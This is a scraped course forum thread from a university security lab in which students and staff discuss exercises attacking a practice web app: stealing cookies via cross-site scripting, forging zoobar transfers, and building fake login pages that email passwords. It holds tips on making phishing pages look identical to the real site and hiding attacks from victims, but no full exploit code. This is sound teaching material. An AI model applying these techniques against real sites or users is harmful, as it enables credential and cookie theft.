<div><p>Are we to email just the password or in the format user/password? The tests seem to expect the latter while the lab webpage doesn&#39;t explicitly say so.</p></div>
<h2>Followup</h2>
<div><p>It seems like some of the tests expect <tt>user/password</tt> while others expect just <tt>password</tt>. Similarly, the cookie tests expect <tt>grader#cookie</tt> while the actual cookie format is <tt>PyZoobarLogin=grader#cookie</tt>. Does the format of the data in emails have to match the expected format exactly?</p>
<p></p></div>
<h3>Followup Response</h3>
<div><p>See also &#64;507.</p></div>
<h3>Followup Response</h3>
<div><p>^ endorsed!</p></div>
<h2>Staff Answer</h2>
<div><p>&#64;542</p></div><hr><h1>make check confusion</h1>
<h3>2018-04-19T02:47:08Z</h3>
<div><p>when I run make check to test my exploits I get:</p>
<p></p>
<p>[ ???? ]: Check email, expecting string &#39;grader#318078806ffc2e86126a2f514d5e6dbf&#39;</p>
<p></p>
<p>but in my email, I am receiving: </p>
<p></p>
<p>Payload:<br /><br />PyZoobarLogin=grader#318078806ffc2e86126a2f514d5e6dbf</p>
<p></p>
<p>The strings are the same so I&#39;m not sure what&#39;s wrong?</p></div>
<h2>Student Answer</h2>
<div><p>I think you&#39;re expected to manually validate that the expected string is what you received in your email. They probably don&#39;t want to hack into your email to check that for you.</p></div>
<h2>Followup</h2>
<div><p>oh dumb of me, thanks!</p></div>
<h2>Followup</h2>
<div><p>&gt; Another copy of the email always goes to 6858-sendmail&#64;lists.csail.mit.edu so that we can monitor abuse and you can receive credit for your work.</p>
<p></p>
<p>Isn&#39;t a copy of the email sent to their list?</p></div>
<h3>Followup Response</h3>
<div><p>Yes I agree with that.</p></div>
<h2>Staff Answer</h2>
<div><p>See &#64;507</p></div><hr><h1>Do we need to cancel the submit request for 11-13?</h1>
<h3>2018-04-19T01:15:45Z</h3>
<div><p>&gt; <strong>Hint</strong>: When a form is submitted, outstanding requests are cancelled as the browser navigates to the new page. This might lead to your request to sendmail.php not getting through. To work around this, consider cancelling the submission of the form using the <code>preventDefault()</code> method on the event object passed to the submit handler, and then use <tt>setTimeout()</tt> to submit the form again slightly later. Remember that your submit handler might be invoked again!</p>
<p></p>
<p>It seemed to work fine for me when I tried it on the latest version of Firefox, and it still submitted the request and sent the email, when I put the request to send email inside the onsubmit handler.</p>
<p></p>
<p>Is this a race condition that depends on timing? (Aka even if it works fine on our computer and sends the email, would it fail to send the email on the grader machines?)</p></div>
<h2>Followup</h2>
<div><p>(I&#39;ve tried it multiple times and it always works/sends the email...)</p></div>
<h2>Followup</h2>
<div><p>Where does it say that HTTP requests are cancelled when navigating to a new page? I couldn&#39;t find information about this anywhere online...</p></div>
<h3>Followup Response</h3>
<div><p>Is there documentation on this?</p></div><hr><h1>submitting part a</h1>
<h3>2018-04-19T00:07:05Z</h3>
<div><p>The lab doesn&#39;t say how to submit part a.</p>
<p></p>
<p>Is there a make submit-a (like in previous labs)?</p>
<p></p>
<p>Separate question: If we submit the entire lab using make submit, do we still need to submit part a separately?</p></div>
<h2>Staff Answer</h2>
<div><p>Yes, there is &#34;make submit-a&#34; list in Makefile. Can you try that and see if the submission show properly in this week slot in the submission website? </p></div>
<h2>Followup</h2>
<div><p>For some reason I&#39;m getting that submit &#34;is denied&#34;</p></div>
<h3>Followup Response</h3>
<div><p>really?</p>
<p>i was able to submit just fine</p>
<p>it shows up on the lab submission page</p></div>
<h3>Followup Response</h3>
<div><p>oh, nvm<br />my bad, I just realized I was trying to submit a scp-ed version haha</p></div><hr><h1>ex 13 user logged in</h1>
<h3>2018-04-19T00:04:44Z</h3>
<div><p>&gt; Modify <code>answer-12.html</code> so that your JavaScript will steal a victim&#39;s zoobars if the user is already logged in (using the attack from Part 2), or otherwise follows exercise 12: ask the victim for their username and password, if they are not logged in, and steal the victim&#39;s password.</p>
<p></p>
<p>So if the user is already logged in, then should we redirect them to <a href="http://css.csail.mit.edu/6.858/2018/">http://css.csail.mit.edu/6.858/2018/?</a></p>
<p></p>
<p>To clarify, this is my interpretation and I wanted to see if it&#39;s correct for Ex 13.</p>
<ul><li>If user is logged in, then transfer 10 zoobars to &#34;attacker&#34; and redirect them to <a href="http://css.csail.mit.edu/6.858/2018/">http://css.csail.mit.edu/6.858/2018/</a> using Part 2 (ex 8).</li><li>Otherwise, if user is not logged in, then display a fake login page, steal their password, and then redirect to the real login page on zoobar (ex 12).</li></ul>
<p></p>
<p>Is this right?</p></div>
<h2>Staff Answer</h2>
<div><p>Exactly!</p></div>
<h2>Followup</h2>
<div><p>How do you determine if the user is logged in?</p></div>
<h3>Followup Response</h3>
<div><p>&#64;518</p></div>
<h2>Followup</h2>
<div><p>in the case they are already logged in, does the transition to the course home page still need to be seamless or can they see the login page for a second?</p></div><hr><h1>ex 9 look</h1>
<h3>2018-04-18T21:35:10Z</h3>
<div><p>&gt; Copy the zoobar login form (either by viewing the page source, or using <tt>zoobar/templates/login.html</tt>) into <code>answer-9.html</code>, and make it work with the existing zoobar site. </p>
<p></p>
<p>Do we need to copy over the CSS for exercise 9? The login page looks very different without the CSS styling.</p>
<p></p>
<p>I&#39;m not sure if for 9-13, we want to mimic the exact look and feel of zoobar in our fake login site, or just have the same functionality.</p></div>
<h2>Staff Answer</h2>
<div><p>Hmm. You shouldn&#39;t need to copy over any CSS or JS files if you request from original source (absolute path), i.e. localhost:8080 :).<br />Straightforward way will require many lines modification, you might consider Hint from Exercise 6 about <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base"><code>&lt;base&gt;</code> HTML element </a>to do the trick in one line.<br /><br />For fake site, I think we should try to mimic the site as much as possible with perfect scenario that user can&#39;t tell the different between the legit site and attacker&#39;s site.</p></div>
<h2>Followup</h2>
<div><p>I added the base HTML element, but I&#39;m not able to get the right template files to load. Am I missing something?  My webpage looks like - </p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/h6qi4cr213h2om/jgf8nfl5t21l/Screen_Shot_20180425_at_11.12.05_AM.png" alt="" width="393" height="99" /></p></div>
<h3>Followup Response</h3>
<div><p>yeah, don&#39;t copy login.html.</p>
<p></p>
<p>copy the &#34;View Source&#34; in zoobar</p></div>
<h3>Followup Response</h3>
<div><p>templates will not work, because your web page is literally an HTML file, not a file that gets interpreted by the backend server</p></div>
<h2>Followup</h2>
<div><p>When I view the source of the login page, it seems to include a zoobar/media/zoobar.css and zoobar/media/lion_sleeping.jpg in the header. Do we need these?</p></div>
<h3>Followup Response</h3>
<div><p>Oh, nevermind, I understand now that you want us to modify the base URL of those resources.</p></div><hr><h1>What exactly to email?</h1>
<h3>2018-04-18T20:38:58Z</h3>
<div>Ex11 asks us to &#34;email the password&#34;, but the grading script says the email should contain &#39;grader/VOINVQLTEECG&#39;, i.e. also the user name.

Same for Ex12.

In Ex13, however, which asks us to do the same as Ex12, the grading script only expects &#39;YZHFAWFLJQTW&#39;, i.e. no user name.

The challenge asks us to email &#34;the username and password (separated by a comma)&#34;, but the grading script says it expects &#39;ZXKGXBKWATQE&#39;, i.e. no user name and no comma.

Will you do automated tests comparing the email contents during the grading and we should worry about these inconsistencies? Or will you check this manually and it&#39;s alright?</div>
<h2>Staff Answer</h2>
<div><p>I agree that there are inconsistency here and will raise this concern among staffs. For now, I will suggest follow the grading script.<br /><br />Ex11 and Ex12: <br />username/password<br />Ex.13 and Challenge:<br />password<br /><br /></p></div>
<h2>Followup</h2>
<div><p>Does this apply to exercises 2, 4, and 5 as well?</p>
<p></p>
<p>Based on the test for alert</p>
<p></p>
<p>[ PASS ]: alert contains: grader#cookie</p>
<p></p>
<p>I assume that as long as it <em>contains</em> grader#cookie it should be fine, so PyZoobarLogin=grader#cookie should be fine right?</p></div>
<h3>Followup Response</h3>
<div><p>Yep PyZoobarLogin=grader#cookie is correct.</p></div>
<h2>Followup</h2>
<div><p>&gt; I agree that there are inconsistency here and will raise this concern among staffs. </p>
<p></p>
<p>Will we be able to get a finalized staff answer before it&#39;s due on Friday? Or should we just stick to the exact format of the grading script and submit it so that we get it in on time?</p></div>
<h3>Followup Response</h3>
<div><p>The safest choice is to stick with what the grader expects.</p></div><hr><h1>opening answer-{6-8}.txt as file</h1>
<h3>2018-04-18T14:54:33Z</h3>
<div><p>How do we open answer-6 (7, 8, etc) as a file://?</p>
<p>They&#39;re located on the VM, and I&#39;m not sure how to open machines from the VM in the host computer. Would it be something like file://localhost:8080/&lt;path&gt;? Or does that only work for the HTTP server, not for FTP protocols?</p></div>
<h2>Student Answer</h2>
<div><p>You can download them to your computer (onto Desktop for example) and use Chrome/Firefox to open that file. </p></div>
<h2>Followup</h2>
<div><p>how? the VM doesn&#39;t even allow copy paste, much less file transfer</p></div>
<h3>Followup Response</h3>
<div><p>winscp or cyberduck will do, depending on your OS. or you can also literally type out your answer locally. </p></div>
<h3>Followup Response</h3>
<div><p>scp httpd&#64;&lt;ip_addr&gt;:~/path/to/file /local/path/to/save/file</p></div>
<h3>Followup Response</h3>
<div><p>you should not be using the VM directly anyway... You turn the VM on, then SSH or mosh into it..... Then you can do basic things like copy and paste....</p></div><hr><h1>ex 6 form</h1>
<h3>2018-04-18T14:47:01Z</h3>
<div><p>The form for exercise 6 doesn&#39;t need to mimic the zoobar page in terms of appearance right? It&#39;s just a form that when you click submit sends the request to the zoobar server?</p></div>
<h2>Staff Answer</h2>
<div>Can you show an example of your form? I don’t think there are any CSS requirements </div>
<h2>Followup</h2>
<div><p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/hzikbgxyeqx1tc/jg5iusbkatuh/Screen_Shot_20180418_at_3.59.58_PM.png" alt="" /></p>
<p>Is this okay? Or should the form try to hide the fact that zoobars=10 and recipient=attacker?</p></div>
<h3>Followup Response</h3>
<div><p>(The 2 input fields are auto-populated with these values, so the user doesn&#39;t fill out anything.) Just wondering if the input fields must be blank so the user doesn&#39;t know it&#39;s being transferred to the attacker, or if this is fine (since the user just clicks send, and they don&#39;t need to fill out the form itself).</p></div>
<h3>Followup Response</h3>
<div><p>Typically, you should try to hide everything as much as possible. However, the lab handout doesn&#39;t explicitly require you to do that in this exercise, so it&#39;s ok based on requirement that you autofill and user click.</p></div>
<h2>Followup</h2>
<div><p>followup: for the image in the thread above, is it fine for exercises 7 and 8? Since for 7 and 8 the user doesn&#39;t interact at all (and for 8 the user isn&#39;t even supposed to see the form because it&#39;s supposed to be fast), so it shouldn&#39;t matter if the form says it&#39;s sending 10 zoobars to attacker right?</p></div><hr><h1>Ex 8 location bar</h1>
<h3>2018-04-18T14:29:20Z</h3>
<div><p>&gt; The location bar of the browser should not contain the zoobar server&#39;s name or address at any point.</p>
<p></p>
<p>What does this mean? The location bar should not contain localhost:8080?</p>
<p>If the location bar is file:/// then won&#39;t the user notice? Or do we assume the attack will occur fast enough that the redirect to <a href="http://css.csail.mit.edu/6.858/2018/">http://css.csail.mit.edu/6.858/2018/</a> will happen before the user notices anything&#39;s wrong?</p></div>
<h2>Staff Answer</h2>
<div><p>The file:/// is only for experiment. When you do real attack, you need server (&#43; domain name if you like), so that you can give your target a url. For example, <a href="http://www.dictionary-me.com">www.dictionary-me.com</a>/search?word=exercise<br />Then in this page you might add the CSRF attack to steal victim&#39;s Zoobar (ex. ZoobarBank.com) and redirect back to your page or other valid dictionary look up page. Suppose victim saw ZoobarBank.com in location bar which mean he/she might also see the UI as well (if it isn&#39;t fast enough), he/she suddenly know that your site is malicious and try to steal his zoobar.<br /><br /></p></div><hr><h1>escaping</h1>
<h3>2018-04-18T03:35:12Z</h3>
<div><p>Does {{ var }} auto-escape variables? I thought they did, but when I tried it out it seems it doesn&#39;t.</p></div>
<h2>Staff Answer</h2>
<div><p>The answer is in your question already! :)</p></div><hr><h1>emails</h1>
<h3>2018-04-18T03:15:19Z</h3>
<div><p>Who are we supposed to send emails to (for exercise 2 and other ones that require sending email)? Are we supposed to send email to ourselves (<a href="mailto:kerberos&#64;mit.edu">kerberos&#64;mit.edu</a>) with the script, or to some 6.858 list?</p></div>
<h2>Followup</h2>
<div><p>I got </p>
<p>[ ???? ]: Check email, expecting string &#39;grader#3c9bff00496643189564b8e2b116df99&#39;</p>
<p></p>
<p>in make check</p>
<p></p>
<p>I get 6 emails every time I run make check. One of the emails I got does contain the right string, does that mean it&#39;s correct. I don&#39;t know why it says ????.</p></div>
<h3>Followup Response</h3>
<div><p>The ???? just means that make check can&#39;t verify that you got this part correct. You have to go to your inbox and check for yourself. </p></div>
<h3>Followup Response</h3>
<div><p>ah okay, was worried i did something wrong</p></div>
<h2>Student Answer</h2>
<div><p>Send it to yourself, so you can check if you managed to steal the cookies correctly. (I believe all emails get copied somewhere so the staff can see stuff during grading?)</p></div>
<h2>Staff Answer</h2>
<div>Correct, email is manually checked right now.</div><hr><h1>Lab 4 - part 1 - check</h1>
<h3>2018-04-17T23:27:29Z</h3>
<div><p>Should we receive three emails as a result of make check on part 1? </p>
<p>I strangely receive only one email.</p>
<p></p>
<p>When I check manually, I&#39;m receiving emails for all three exercises.    </p></div>
<h2>Followup</h2>
<div><p>wait same</p></div>
<h3>Followup Response</h3>
<div><p>I got 5-6 emails before implementing exercises 3-5, now I only get 1...</p></div>
<h3>Followup Response</h3>
<div><p>actually, the emails just take a few minutes to arrive sometimes (for me, the 2 emails arrived 6 minutes after the 1st despite displaying the same time in the email) weird...</p></div>
<h3>Followup Response</h3>
<div><p>then again, i&#39;ve had emails delayed by months sometimes so maybe it isn&#39;t that weird after all</p>
<p>and emails delayed by hours is fairly common (not rare at least)</p></div>
<h3>Followup Response</h3>
<div><p>i just got an email 14 hours late, so yeah emails getting delayed is very common</p>
<p></p>
<p>it&#39;s strange, how does email work? do the TCP packets keep getting dropped or something? D:</p></div><hr><h1>getting an alert box?</h1>
<h3>2018-04-17T21:46:33Z</h3>
<div><p>I just put alert(&#34;hello world&#34;); in script tags in users.html as a starting point and I can&#39;t even get that to work. I remember something about browsers suppressing pop-ups so we did that img load on-error thing, but I don&#39;t remember how that worked and I can&#39;t find it in the recitation notes--is that what we need here? Where exactly should I be seeing errors in the developer tools? I am so lost.</p></div>
<h2>Student Answer</h2>
<div><p>resolved</p></div>
<h2>Followup</h2>
<div>What was the resolution to this?</div>
<h3>Followup Response</h3>
<div><p>you have to actually look up a user, not just go to the lookup page</p></div><hr><h1>Website Look Tests</h1>
<h3>2018-04-17T19:28:20Z</h3>
<div><p>Exercises 5, 13, and 14, as well as the challenge exercise, require that the displayed site look a certain way. The <tt>make check</tt>script is not smart enough to compare how the site looks with and without your attack, so you will need to do that comparison yourself (and so will we, during grading). When <tt>make check</tt> runs, it generates reference images for what the attack page is <i>supposed</i> to look like (<tt>answer-XX.ref.png</tt>) and what your attack page actually shows (<tt>answer-XX.png</tt>), and places them in the <tt>lab4-tests/</tt> directory.</p>
<p></p>
<p>Does this mean that we just compare answer-XX.ref.png with answer-XX.png? And if they look the same then we&#39;re good? Or do we still need to load the website ourselves in ex 5, 13, and 14 to manually inspect the page and make sure it looks the same?</p></div>
<h2>Followup</h2>
<div><p>If it&#39;s just comparing the 2 images, does that mean a pixel by pixel comparison? Or the images looking close enough to fool the user?</p></div>
<h3>Followup Response</h3>
<div><p>if you run make check, it looks like they are comparing pixel by pixel</p></div>
<h3>Followup Response</h3>
<div><p>In that case, why does it say</p>
<p></p>
<p><em>The <tt>make check</tt>script is not smart enough to compare how the site looks with and without your attack, so you will need to do that comparison yourself (and so will we, during grading).</em></p>
<p><em></em></p>
<p>Shouldn&#39;t make check be smart enough to compare the reference images perfectly if it does pixel-by-pixel?</p></div>
<h2>Staff Answer</h2>
<div>If the screenshots look the same you’re good to go!</div>
<h2>Followup</h2>
<div><p>how do i view the screenshots if im sshed in the virtual machine?</p></div>
<h3>Followup Response</h3>
<div><p>scp</p></div><hr><h1>lab 4 exercise 6</h1>
<h3>2018-04-17T08:27:38Z</h3>
<div><p>Is it sufficient to only have an HTML page containing the <code>form</code> element and any other scripts for part 2? The instructions say only to &#34;Copy the form part of the page (the part enclosed in <code>&lt;form&gt;</code>tags) into <code>answer-6.html</code> on your machine.&#34; If that&#39;s the case, we don&#39;t necessarily need the <code>base</code> element, right? Or do we need to make the answer pages look like the real zoobar page, including the page title, styling, header image, etc?</p>
<p></p>
<p>What about for part 3--does the fake login page have to look like the real zoobar page? </p></div>
<h2>Staff Answer</h2>
<div><p>Styling is not required in this part but you will need it for part3 because you try to fake the site :)</p></div><hr><h1>Tuesday 4/17 OH 4:30-6:30 still happening (eom)</h1>
<h3>2018-04-17T07:09:14Z</h3>
<div><p></p></div><hr><h1>Lab 4 Exercise 5 - Rendering issues</h1>
<h3>2018-04-16T03:50:24Z</h3>
<div><p>My attack URL for exercise 5 renders identically to the regular users page in Firefox 59.0.2 on my Mac, but when I run <tt>make check</tt>, the image is slightly different from the reference. What is being used to render the images, and how can I debug this?</p>
<p></p>
<p>The assignment says the current version of Firefox will be used for grading, so can I ignore the image mismatch issue?</p></div>
<h2>Followup</h2>
<div><p>I have a similar issue wherein my User and input rectangle are slightly shifted (maybe exactly one pixel) compared to the reference (based on the results of <tt>make check</tt>). I&#39;ve spent many hours trying to debug this and I have no clue what&#39;s causing it. When viewing in Firefox, they look identical. Can I ignore this?</p></div>
<h3>Followup Response</h3>
<div>I had the same problem and solved it by removing all whitespace between my injected tags.</div>
<h3>Followup Response</h3>
<div><p>Thank you so much!</p></div>
<h2>Staff Answer</h2>
<div><p>You should be able to see the different by viewing answer-5.ref.png and answer-5.png generated by test script in ~/lab/lab4-tests directory.<br />Common problem: having an element that is transparent but and forgot to hide the element &gt;&gt; end up moving position or changing size other element </p></div><hr><h1>Lab 4 - Can&#39;t register a user?</h1>
<h3>2018-04-15T23:40:32Z</h3>
<div><p>I just checked out the lab4 branch (without merging) and ran &#39;make clean&#39; and &#39;make&#39; in the VM. However, when I try to register a user in zoobar, I get &#34;Registration Failed.&#34; What am I missing here?</p></div>
<h2>Staff Answer</h2>
<div>Can you show me what your server log gives you? The one that appears when you run the server from the terminal. </div>
<h2>Student Answer</h2>
<div><p>Resolved. Strangely, running &#39;make check&#39; fixed it.</p></div>
<h2>Followup</h2>
<div><p>Old server log:</p>
<pre>zookld: Listening on port 8080<br />zookld: Launching zookd<br />zookld: zookd: pid 773<br />zookld: Launching service 1: zookfs_svc<br />zookld: zookfs_svc: pid 774<br />zookd: Start with 1 service(s)<br />zookd: Dispatch ^(.*)$ for service 1<br />zookd: Forward /zoobar/media/lion_sleeping.jpg to service 1<br />zookd: Forward /zoobar/media/zoobar.css to service 1<br />zookd: Forward /zoobar/index.cgi/ to service 1<br />zookd: Forward /zoobar/index.cgi/login to service 1<br />zookd: Forward / to service 1<br />zookd: Forward /zoobar/media/lion_sleeping.jpg to service 1<br />zookd: Forward /zoobar/media/zoobar.css to service 1<br />zookd: Forward /zoobar/index.cgi/ to service 1<br />zookd: Forward /zoobar/index.cgi/login to service 1<br />zookd: Forward / to service 1<br />zookd: zookd: Forward /zoobar/media/lion_sleeping.jpg to service 1Forward /zoobar/index.cgi/ to service 1<br /><br />zookd: Forward /zoobar/media/zoobar.css to service 1<br />zookd: Forward /zoobar/index.cgi/login to service 1<br />zookd: Forward /zoobar/index.cgi/login to service 1<br />zookd: Forward /zoobar/media/zoobar.css to service 1<br />zookd: Forward /zoobar/media/lion_sleeping.jpg to service 1<br />zookd: Forward /zoobar/index.cgi/login to service 1<br />zookd: Forward /zoobar/media/zoobar.css to service 1<br />zookd: Forward /zoobar/media/lion_sleeping.jpg to service 1<br />zookd: Forward /zoobar/index.cgi/login to service 1<br />zookd: Forward /zoobar/media/zoobar.css to service 1<br />zookd: Forward /zoobar/media/lion_sleeping.jpg to service 1</pre>
<p>Server log after running <tt>make check</tt>:</p>
<pre>zookld: Listening on port 8080
zookld: Launching zookd
zookld: zookd: pid 1640
zookld: Launching service 1: zookfs_svc
zookld: zookfs_svc: pid 1641
zookd: Start with 1 service(s)
zookd: Dispatch ^(.*)$ for service 1
zookd: Forward / to service 1
zookd: Forward /favicon.ico to service 1
zookd: Forward /zoobar/index.cgi/ to service 1
zookd: Forward /zoobar/index.cgi/login to service 1
zookd: Forward /zoobar/media/zoobar.css to service 1
zookd: Forward /zoobar/media/lion_sleeping.jpg to service 1
zookd: Forward /favicon.ico to service 1
zookd: Forward /zoobar/index.cgi/login to service 1
zookd: Forward /zoobar/index.cgi/ to service 1
zookd: Forward /zoobar/media/zoobar.css to service 1
zookd: Forward /zoobar/media/lion_awake.jpg to service 1
zookd: Forward /favicon.ico to service 1</pre>
<p>Nothing significant seems to have changed, but I can register users now.</p></div><hr><h1>Lab 4 Exercise 2</h1>
<h3>2018-04-14T19:10:23Z</h3>
<div><p>So, I&#39;m not sure if my current bug is from a new version of chrome, or because I haven&#39;t fully implemented it. </p>
<p>In exercise 2, we are exploiting a cross site scripting attack, and when I attempt to load the page I get this in the console:</p>
<p></p>
<p>Blocked current origin from receiving cross-site document at <a href="http://css.csail.mit.edu/6.858/2018/labs/sendmail.php">http://css.csail.mit.edu/6.858/2018/labs/sendmail.php</a>..........</p>
<p></p>
<p>Is this a new security feature, or is there a way to get around this?</p></div>
<h2>Student Answer</h2>
<div><p>Resolved on my own. tl;dr,  I was url-encoding too much of the string.</p></div><hr><h1>trouble fixing zoobar theft error</h1>
<h3>2018-04-13T19:46:55Z</h3>
<div><p>I&#39;m having trouble figuring out how the zoobar theft error is arising in cases when the sender appears to be sending a valid amount of zoobars to a distinct recipient.  an example of when this happens is: </p>
<p></p>
<p>Trying concrete value: {&#39;form_recipient_present&#39;: 30L, &#39;rsplit_cookie_val_#_l&#39;: &#39;alice&#39;, &#39;cookie_name&#39;: &#39;PyZoobarLogin&#39;, &#39;cookie_val&#39;: &#39;alice#atok&#39;, &#39;form_zoobars_present&#39;: 31L, &#39;rsplit_cookie_val_#_r&#39;: &#39;atok&#39;, &#39;cookie&#39;: &#39;PyZoobarLogin=alice#atok&#39;, &#39;path&#39;: &#39;fer&#39;, &#39;form_recipient_val&#39;: &#39;bob&#39;, &#39;form_zoobars_val&#39;: &#39;1&#39;}</p>
<p></p>
<p>this seems like alice is sending bob 1 zoobar -- so I&#39;m having trouble seeing why this is leading to the zoobar theft alert. </p></div>
<h2>Student Answer</h2>
<div>I was confused about this—the issue was that I was reporting zoobar theft incorrectly. So the problem was with exercise 9, not exercise 10.</div><hr><h1>Lab 4 Exercise 11</h1>
<h3>2018-04-13T18:52:40Z</h3>
<div><p>In this problem it states &#34;Please note that after implementing this exercise, the attacker controller webpage will no longer redirect the user to be logged in correctly.&#34; Just to be sure - <strong>for this exercise</strong>, all that we need is that when the user clicks on &#34;Log in&#34; or &#34;Register&#34;, an email is sent to us with their password? It doesn&#39;t matter what else happens? (whether they&#39;re directed to the actual login page, etc.)</p></div>
<h2>Followup</h2>
<div><p>I have the same question because in my case the user still gets redirected to the homepage after logging in successfully.</p></div>
<h3>Followup Response</h3>
<div><p>Also, I wonder if I did something wrong because in exercise 12, we are asked to fix the redirect problem but my code is already redirecting the user to the right page. </p></div>
<h3>Followup Response</h3>
<div>See answer above. </div>
<h2>Staff Answer</h2>
<div>The check in exercise 11 is not strong. Aka as long as the email is sent, you get the checkoff. In exercise 12 you make sure the redirect happens correctly.<div><br /></div><div>If you implemented 11 such that the login happens correctly, you’ve done both exercises correctly!</div></div><hr><h1>Exercise 2 &#34;Check email, ...&#34;</h1>
<h3>2018-04-13T15:40:53Z</h3>
<div><p>Hi,</p>
<p></p>
<p>I seem to be failing exercise 2, with the error saying </p>
<p></p>
<p>Check email, expecting string &#39;</p>
<p></p>
<p>That wasn&#39;t very helpful so i dug through grading.js to figure out what they were expecting. I called console.log on the &#34;expecting&#34; cookie and it seemed to be the same as the one emailed to me, so I&#39;m not quite sure what&#39;s wrong. Can anyone point me in the right direction?</p>
<p></p>
<p>Thanks!</p></div>
<h2>Staff Answer</h2>
<div><p>Yeah you should be good as long as you got the email that the checker says it&#39;s expecting.</p></div>
<h2>Student Answer</h2>
<div><p>It should say something like </p>
<p></p>
<pre>[ ???? ]: Check email, expecting string &#39;grader#ee406d451a5ec9ed9965bae377d2ab97&#39;</pre>
<p>Which shows the cookie that should be emailed to you. </p></div><hr><h1>Exercise 10</h1>
<h3>2018-04-13T04:41:53Z</h3>
<div><p>So in the sent values: </p>
<p></p>
<p>{&#39;referrer&#39;: &#39;&#39;, &#39;form_recipient_present&#39;: 31L, &#39;rsplit_cookie_val_#_l&#39;: &#39;bob&#39;, &#39;cookie_name&#39;: &#39;PyZoobarLogin&#39;, &#39;cookie_val&#39;: &#39;bob#btok&#39;, &#39;form_zoobars_present&#39;: 32L, &#39;rsplit_cookie_val_#_r&#39;: &#39;btok&#39;, &#39;cookie&#39;: &#39;PyZoobarLogin=bob#btok&#39;, &#39;path&#39;: &#39;fer&#39;, &#39;form_recipient_val&#39;: &#39;a\x0e&#39;, &#39;form_zoobars_val&#39;: &#39;-1&#39;}</p>
<p></p>
<p>Why is the rsplit_cookie_val? What does that mean?</p></div>
<h2>Staff Answer</h2>
<div><p>If you look at your cookie, you see the cookie value &#34;PyZoobarLogin=bob#btok&#34;. The rsplit is essentially a variable corresponding to a specific substring of the cookie. You should look through the code and find the specific variable name for more details about this.</p></div><hr><h1>URL Encoding</h1>
<h3>2018-04-13T04:05:31Z</h3>
<div><p>In Firefox (whatever version, probably recent, that I&#39;m running on my Windows 10 machine), if I enter a URL with, e.g., characters like &#34;&lt;&#34; and &#34;&gt;&#34; in it, that seems to work fine. However, when I copy-paste the URL, these show up as &#34;%3C&#34; and &#34;%3E&#34;. Which version should I use in answer-3.txt? Is Firefox just being smart and doing the escaping for me? If so, do I still submit my answer with explicit escaping?</p></div>
<h2>Followup</h2>
<div><p>I think the escaped version is better, it&#39;s more general</p></div>
<h2>Staff Answer</h2>
<div><p>The answer by your fellow classmate is correct! In general, you shouldn&#39;t expect your browser to be able to auto-url encode on the fly. The URL encoded version is safer to use.</p></div><hr><h1>answer-1.txt</h1>
<h3>2018-04-13T03:24:04Z</h3>
<div><p>I&#39;m having trouble loading the scripts. I&#39;m not sure where to put the answer-\d files. I have tried zoobar/ and zoobar/template but I keep getting this error &#34;GET http://localhost:8080/zoobar/index.cgi/answer-1.js 404 (NOT FOUND)&#34;. </p></div>
<h2>Student Answer</h2>
<div><p>I&#39;m not sure where/why you&#39;re trying to load the scripts... these should run from the Users page.</p></div>
<h2>Followup</h2>
<div><p>I was asking about how to make the path works. So right now I have &lt;script type=&#34;text/javascript&#34; src=&#34;answer-1.js&#34;&gt;&lt;/script&gt; in users.html but it doesn&#39;t work. </p></div>
<h3>Followup Response</h3>
<div><p>You&#39;ve tried a couple of different folders to put the script in - do you use this same exact path each time or do you also go up a directory or two in the path? E.g. &#34;../answer-1.js&#34;. I think the issue may be that you don&#39;t want it routed through index.cgi. Think about which of the folders you&#39;ve tried would avoid that and how you might update the path for that folder relative to where users.html is.</p></div>
<h3>Followup Response</h3>
<div><p>You should just copy paste your code as in line javascript. E.g. in user.html</p>
<p></p>
<pre>&lt;script&gt;<br />alert(&#34;foobarbaz&#34;);<br />&lt;/script&gt;</pre>
<p></p></div>
<h3>Followup Response</h3>
<div><p>If you&#39;re having any hard to fix issues, I would just do what &#64;Budmonde suggests; it&#39;ll work, and it&#39;s easy. I&#39;ll note, though, that I did just have my Users page load my &#96;answer-*.js&#96; file, just so I only had to change it in one location; you can make this work, but it&#39;s not worth much effort (especially as the scripts are so short).</p></div>
<h3>Followup Response</h3>
<div><p>That works. Thanks!</p></div><hr><h1>Remember when to semicolon in JS</h1>
<h3>2018-04-13T02:36:23Z</h3>
<div><p>Just so nobody else has to waste time debugging this - if you&#39;re like me and omit (almost) all semicolons in Javascript, don&#39;t forget to always end a line with a semicolon if the next one starts with &#34;(&#34; (e.g. the example email-sending code for Lab 4 exercise 2).</p></div>
<h2>Followup</h2>
<div><p>I always semicolon;</p>
<p>in fact in Python i have to remember to delete the semicolon;</p>
<p>so i don&#39;t have problems with extra semicolon;</p></div><hr><h1>Exercise 10</h1>
<h3>2018-04-13T01:40:30Z</h3>
<div><p>I&#39;m having a hard time finding the bugs just by reading the logs in typescript. Do you have any suggestions on how to go about finding the bugs?</p>
<p></p>
<p>Thanks!</p></div>
<h2>Staff Answer</h2>
<div><p>&#64;469 Did you try to read lines in this format?<br /><br />Trying concrete value: {&#39;referrer&#39;: &#39;&#39;, &#39;form_recipient_present&#39;: 31L, &#39;rsplit_cookie_val_#_l&#39;: &#39;bob&#39;, &#39;cookie_name&#39;: &#39;PyZoobarLogin&#39;, &#39;cookie_val&#39;: &#39;bob#btok&#39;, &#39;form_zoobars_present&#39;: 32L, &#39;rsplit_cookie_val_#_r&#39;: &#39;btok&#39;, &#39;cookie&#39;: &#39;PyZoobarLogin=bob#btok&#39;, &#39;path&#39;: &#39;fer&#39;, &#39;form_recipient_val&#39;: &#39;a\x0e&#39;, &#39;form_zoobars_val&#39;: &#39;-1&#39;}<br /><br />Try consider who send to whom, transfered amount, and result.<br />You can find bug easily by observation. After you notice, you can also verify such weird behavior by interacting with web UI. </p></div>
<h2>Followup</h2>
<div><p>Use Javascript instead of Typescript?</p></div><hr><h1>check-symex-zoobar.py</h1>
<h3>2018-04-13T01:38:33Z</h3>
<div><p>On line 75 of check-symex-zoobar.py, what does zoobar.app(environ, startresp) call?</p>
<p></p>
<p>Thanks!</p></div><hr><h1>Late hours</h1>
<h3>2018-04-12T20:28:59Z</h3>
<div><p>Do late hours work for lab 5? As in, can late hours be used for the final project (either the default or a proposed project)?</p>
<p></p>
<p>(asking since in some classes late hours cannot be used for final lab/project)</p></div>
<h2>Followup</h2>
<div><p>bump</p></div>
<h3>Followup Response</h3>
<div><p>I&#39;m not sure what the policy for late hours on the final project is this year, but we will discuss this and get back to you. </p></div>
<h3>Followup Response</h3>
